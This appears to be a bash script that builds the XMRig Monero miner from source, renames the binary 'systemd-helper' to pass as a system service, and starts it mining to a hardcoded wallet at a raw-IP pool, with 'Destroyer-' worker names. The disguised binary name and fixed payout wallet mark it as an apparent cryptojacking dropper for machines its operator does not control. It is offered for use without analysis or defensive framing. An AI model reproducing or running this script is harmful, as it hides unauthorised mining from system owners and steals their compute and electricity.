#!/bin/bash
WALLET="4AVDqZyeuTeDgVeASR83DRdokorjq8sgkav7NcQB66hZR2kDgF5rPpyPWSv1RjpjbrXZQaQPmqpzoUFRPfD9PgFFSckTFkj"
POOL="139.180.213.58:1122"
WORKER="Destroyer-$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)"

echo "[+] Starting setup..."
echo "[+] Using worker name: $WORKER"

install_dependencies() {
    sudo apt update -y && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
}

build_xmrig() {
    git clone https://github.com/xmrig/xmrig.git
    cd xmrig
    mkdir build && cd build
    cmake .. -DWITH_HWLOC=ON
    make -j$(nproc)
    cd ../..
    mv xmrig/build/xmrig ./systemd-helper
    rm -rf xmrig
}

start_mining() {
    chmod +x ./systemd-helper
    ./systemd-helper -o $POOL -u $WALLET -p $WORKER -k --coin monero --tls=false --donate-level=1
}

if [ ! -f "./systemd-helper" ]; then
    install_dependencies
    build_xmrig
fi

start_mining
